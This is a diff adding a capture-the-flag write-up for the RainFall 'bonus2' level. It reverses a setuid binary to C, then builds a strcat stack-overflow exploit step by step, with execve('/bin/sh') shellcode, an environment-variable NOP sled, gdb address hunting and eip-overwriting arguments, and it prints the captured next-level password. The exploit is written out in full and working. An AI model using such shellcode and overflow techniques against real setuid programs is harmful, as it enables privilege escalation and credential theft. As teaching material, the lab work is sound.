@@ -1,0 +1,149 @@
+
+```bash
+bonus2@RainFall:~$ ls -la
+-rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2
+
+bonus2@RainFall:~$ file bonus2 
+bonus2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf71cccc3c27dfb47071bb0bc981e2dae92a47844, not stripped
+```
+
+Reversed in c:
+```c
+int language = 0;
+
+int greetuser(char *src)
+{
+    char dest[64];
+
+    switch (language)
+    {
+        case 1:
+            strcpy(dest, "Hyvää päivää ");
+        case 2:
+            strcpy(dest, "Goedemiddag! ");
+        case 0:
+            strcpy(dest, "Hello ");
+    }
+    strcat(dest, &src);
+    return puts(dest);
+}
+
+int main(int argc, const char **argv, const char **envp)
+{
+    char v4[76];
+    char dest[76];
+    char *env_lang;
+
+    if (argc != 3)
+    {
+        return 1;
+    }
+
+    memset(dest, 0, sizeof(dest));
+
+    strncpy(dest, argv[1], 40);
+    strncpy(dest + 40, argv[2], 32);
+    env_lang = getenv("LANG");
+
+    if (env_lang)
+    {
+        if (memcmp(env_lang, "fi", 2u) == 0)
+        {
+            language = 1;
+        }
+        if (memcmp(env_lang, "nl", 2u) == 0)
+        {
+            language = 2;
+        }
+    }
+    memcpy(v4, dest, sizeof(v4));
+    return greetuser(v4);
+}
+```
+
+The strcat is unsafe we can use it to write over `eip`
+First we need a shellcode to start execve:
+```asm
+0:  31 c0                   xor    eax,eax      ; eax = 0
+2:  31 d2                   xor    edx,edx      ; edx == 0 (envp = NULL)
+4:  50                      push   eax          ; push 0 (NULL)  -- terminator for argv/envp
+5:  68 2f 2f 73 68          push   0x68732f2f   ; push "//sh"
+a:  68 2f 62 69 6e          push   0x6e69622f   ; push "/bin"
+f:  89 e3                   mov    ebx,esp      ; ebx -> "/bin//sh" (filename)
+11: 50                      push   eax          ; push NULL (argv terminator)
+12: 53                      push   ebx          ; push pointer to filename
+13: 89 e1                   mov    ecx,esp      ; ecx -> argv (pointer to array [filename, NULL])
+15: b0 0b                   mov    al,0xb       ; syscall number 11 = execve
+17: cd 80                   int    0x80         ; invoke kernel
+```   
+
+We can use so website (https://defuse.ca/online-x86-assembler.htm#disassembly) or compiler to get the shell code in a full string:
+"\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"
+
+And we gonna inject this shell code in the stack, with the call getenv() :
+```bash
+rm -f /tmp/payload_bonus2_env
+rm -f /tmp/payload_bonus2_args1
+rm -f /tmp/payload_bonus2_args1
+printf '\x90%.0s' {1..100} > /tmp/payload_bonus2_env # Padding NOP instruction
+echo -ne "\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80" >> /tmp/payload_bonus2_env # shell-code
+export LANG=nl$(cat /tmp/payload_bonus2_env)
+```
+
+Now we break after the `getenv()` call to retrive the address:
+```bash
+$ gdb --args ./bonus2 "$(cat /tmp/payload_bonus2_args1)" "$(cat /tmp/payload_bonus2_args2)"
+(gdb) b *0x80485ab
+Breakpoint 1 at 0x80485ab
+(gdb) run
+Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+Breakpoint 1, 0x080485ab in main ()
+(gdb) info register
+eax            0xbffffeb4	-1073742156
+ecx            0x804873a	134514490
+edx            0xbffffeb1	-1073742159
+ebx            0xbffff610	-1073744368
+esp            0xbffff5c0	0xbffff5c0
+ebp            0xbffff678	0xbffff678
+esi            0x0	0
+edi            0xbffff65c	-1073744292
+eip            0x80485ab	0x80485ab <main+130>
+eflags         0x200286	[ PF SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) x/40x 0xbffffeb4
+0xbffffeb4:	0x9090696c	0x90909090	0x90909090	0x90909090
+0xbffffec4:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffed4:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffee4:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffef4:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffff04:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbfffff14:	0x90909090	0xc0319090	0x6850d231	0x68732f2f
+0xbfffff24:	0x69622f68	0x50e3896e	0xb0e18953	0x0080cd0b
+0xbfffff34:	0x454e494c	0x35373d53	0x4c485300	0x323d4c56
+0xbfffff44:	0x4d4f4800	0x682f3d45	0x2f656d6f	0x72657375
+```
+
+and now we just need to change `eip`:
+```
+export LANG=nl$(cat /tmp/payload_bonus2_env)
+
+printf 'A%.0s' {1..40} > /tmp/payload_bonus2_args1 # padding
+
+printf 'B%.0s' {1..23} > /tmp/payload_bonus2_args2 # padding
+echo -ne "\x14\xff\xff\xbf" >> /tmp/payload_bonus2_args2 # write payload address (0xbfffff14)
+echo -ne "\0" >> /tmp/payload_bonus2_args2
+```
+
+And we can run the payload:
+```bash
+bonus2@RainFall:~$ ./bonus2 "$(cat /tmp/payload_bonus2_args1)" "$(cat /tmp/payload_bonus2_args2)"
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB���
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
